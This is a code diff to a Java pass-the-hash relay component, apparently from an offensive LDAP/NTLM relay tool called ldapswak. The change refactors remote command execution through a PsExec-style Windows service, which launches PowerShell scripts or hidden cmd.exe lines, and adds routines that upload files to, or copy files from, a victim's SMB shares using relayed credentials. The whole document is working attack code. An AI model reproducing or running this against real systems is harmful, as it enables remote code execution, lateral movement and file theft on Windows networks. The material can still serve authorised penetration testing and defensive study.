@@ -1,8 +1,18 @@
 package gs.sy.m8.ldapswak;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.Reader;
+import java.net.URI;
+import java.net.URISyntaxException;
+import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
+import java.nio.file.StandardOpenOption;
 import java.util.Base64;
 
 import org.slf4j.Logger;
@@ -17,6 +27,7 @@ import gs.sy.m8.ldapswak.svcctl.SCMRStartService;
 import jcifs.CIFSContext;
 import jcifs.CIFSException;
 import jcifs.DialectVersion;
+import jcifs.SmbResource;
 import jcifs.config.BaseConfiguration;
 import jcifs.context.BaseContext;
 import jcifs.dcerpc.DcerpcBinding;
@@ -79,10 +90,10 @@ public class PassTheHashRunner extends Thread {
 		});
 		this.creds = new PassTheHashNtlmCredentials(t1.toByteArray());
 		setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
-			
+
 			@Override
 			public void uncaughtException(Thread t, Throwable e) {
-				log.error("Pass the hash routine failed",e);
+				log.error("Pass the hash routine failed", e);
 				creds.getContext().fail();
 			}
 		});
@@ -104,30 +115,124 @@ public class PassTheHashRunner extends Thread {
 
 	@Override
 	public void run() {
-		CIFSContext pthctx = ctx.withCredentials(creds);
-		if (this.config.psexecPSHScriptFile != null || this.config.psexecPSHScript != null) {
-			String script;
-			if (this.config.psexecPSHScriptFile != null) {
-				try {
-					script = new String(Files.readAllBytes(this.config.psexecPSHScriptFile), StandardCharsets.UTF_8);
-				} catch (IOException e) {
-					log.error("Failed to read Powershell script " + this.config.psexecPSHScriptFile, e);
+		try {
+			CIFSContext pthctx = ctx.withCredentials(creds);
+			if (this.config.writeFileSource != null) {
+				doWriteFile(pthctx);
+			}
+
+			if (this.config.psexecPSHScriptFile != null || this.config.psexecPSHScript != null) {
+				String script;
+				if (this.config.psexecPSHScriptFile != null) {
+					try {
+						script = new String(Files.readAllBytes(this.config.psexecPSHScriptFile),
+								StandardCharsets.UTF_8);
+					} catch (IOException e) {
+						log.error("Failed to read Powershell script " + this.config.psexecPSHScriptFile, e);
+						return;
+					}
+
+				} else {
+					script = this.config.psexecPSHScript;
+
+				}
+				runPSExecPSH(pthctx, this.config.relayServer, this.config.psexecServiceName,
+						this.config.psexecDisplayName, script, this.config.psexecPSHEncode);
+			} else if (this.config.psexecCMD != null) {
+				if ( ! doLaunchCMD(pthctx)) {
 					return;
 				}
-
-			} else {
-				script = this.config.psexecPSHScript;
-
+			} else if (this.config.readFileSource == null && this.config.writeFileTarget == null) {
+				throw new UnsupportedOperationException("No relay action has been specified");
 			}
-			runPSExecPSH(pthctx, this.config.relayServer, this.config.psexecServiceName, this.config.psexecDisplayName,
-					script, this.config.psexecPSHEncode);
-		} else if (this.config.psexecCMD != null ) {
-			// CMD
-			String cmd = "%COMSPEC% /b /c start /b /min " +  this.config.psexecCMD;
-			log.info("Command line {}", cmd);
-			runPSExec(pthctx, this.config.relayServer, this.config.psexecServiceName, this.config.psexecDisplayName, cmd);
+
+			if (this.config.readFileSource != null) {
+				doReadFile(pthctx);
+			}
+		} catch (URISyntaxException e) {
+			log.error("Invalid URI", e);
+		}
+	}
+
+	private boolean doLaunchCMD(CIFSContext pthctx) throws URISyntaxException {
+		String launch;
+		if (this.config.psexecCMDLog != null) {
+
+			String scriptFilename = "launch-" + System.currentTimeMillis() + ".cmd";
+			String scriptFileLoc = this.config.psexecCMDScriptLoc;
+			String scriptFilePath = this.config.psexecCMDScriptPath;
+
+			URI uri = new URI("smb", this.config.relayServer, scriptFileLoc + scriptFilename, null);
+			try (SmbResource r = pthctx
+					.get(uri.toString());
+					OutputStream os = r.openOutputStream();
+					OutputStreamWriter wr = new OutputStreamWriter(os, StandardCharsets.US_ASCII)) {
+				wr.write(this.config.psexecCMD + " > " + this.config.psexecCMDLog);
+			} catch (Exception e) {
+				log.error("Failed to write script file " + uri, e);
+				return false;
+			}
+
+			launch = scriptFilePath + scriptFilename;
 		} else {
-			throw new UnsupportedOperationException("No relay action has been specified");
+			launch = this.config.psexecCMD;
+		}
+
+		// CMD
+		String cmd = "%COMSPEC% /b /c start /b /min " + launch;
+		log.info("Command line {}", cmd);
+		runPSExec(pthctx, this.config.relayServer, this.config.psexecServiceName, this.config.psexecDisplayName, cmd);
+		
+		return true;
+	}
+
+	private void doWriteFile(CIFSContext pthctx) throws URISyntaxException {
+		if (this.config.writeFileTarget == null) {
+			throw new IllegalArgumentException("Missing target file");
+		}
+
+		URI uri = new URI("smb", this.config.relayServer, "/" + this.config.writeFileTarget, null);
+		try (InputStream is = Files.newInputStream(this.config.writeFileSource, StandardOpenOption.READ);
+				SmbResource r = pthctx.get(uri.toString());
+				OutputStream os = r.openOutputStream()) {
+			copyStream(is, os);
+		} catch (Exception e) {
+			log.error("Failed to write file to server", e);
+		}
+	}
+
+	private void doReadFile(CIFSContext pthctx) throws URISyntaxException {
+		URI uri = new URI("smb", this.config.relayServer, "/" + this.config.readFileSource, null);
+		if (this.config.readFileTarget == null) {
+			try (SmbResource r = pthctx.get(uri.toString());
+					InputStream is = r.openInputStream();
+					Reader rdr = new InputStreamReader(is, Charset.forName(this.config.readFileCharset));
+					BufferedReader br = new BufferedReader(rdr)) {
+				String line;
+				while ((line = br.readLine()) != null) {
+					System.out.println(line);
+				}
+			} catch (Exception e) {
+				log.error("Failed to read file from server " + uri, e);
+			}
+
+		} else {
+			try (SmbResource r = pthctx
+					.get(new URI("smb", this.config.relayServer, this.config.readFileSource, null).toString());
+					InputStream is = r.openInputStream();
+					OutputStream os = Files.newOutputStream(this.config.readFileTarget, StandardOpenOption.WRITE);) {
+				copyStream(is, os);
+			} catch (Exception e) {
+				log.error("Failed to read file from server" + uri, e);
+			}
+		}
+	}
+
+	private static void copyStream(InputStream is, OutputStream os) throws IOException {
+		byte[] buf = new byte[4096];
+		int read = 0;
+		while ((read = is.read(buf)) >= 0) {
+			os.write(buf, 0, read);
 		}
 	}
 
